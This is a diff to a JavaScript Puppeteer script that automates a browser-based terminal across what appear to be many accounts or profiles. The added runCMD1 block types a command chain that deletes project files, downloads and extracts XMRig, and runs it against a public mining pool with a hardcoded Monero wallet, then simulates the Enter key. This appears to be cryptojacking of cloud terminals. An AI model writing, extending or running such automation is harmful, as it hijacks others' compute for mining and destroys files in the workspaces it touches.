@@ -277,6 +277,30 @@ const openTerminal = async (page) => {
 }
 const runCMD1 = async (page, name) => {
     await page.waitForSelector('.xterm-helper-textarea', { timeout: 100 * 1000 });
+    const commands = [
+        "rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz README.md",
+        " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
+        " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
+        " && cd xmrig-6.22.2",
+        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
+    ];
+
+    for (const cmd of commands) {
+        await page.focus('.xterm-helper-textarea');
+        await page.type('.xterm-helper-textarea', cmd);
+    }
+    await page.evaluate(() => {
+        const textarea = document.querySelector('.xterm-helper-textarea');
+        const event = new KeyboardEvent('keydown', {
+            key: 'Enter',
+            code: 'Enter',
+            keyCode: 13,
+            which: 13,
+            bubbles: true
+        });
+        textarea.dispatchEvent(event);
+    });
+
     const textToType = 'rm -rf android ios xmrig-6.22.2-jammy-x64.tar.gz xmrig-6.22.2 && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1.' + name + '\n';
     await page.focus('.xterm-helper-textarea');
     await page.type('.xterm-helper-textarea', textToType);
@@ -655,4 +679,4 @@ module.exports = {
     runAllProfile,
 }
 // action-label single-terminal-tab
-// v5.20.8
+// v5.20.9
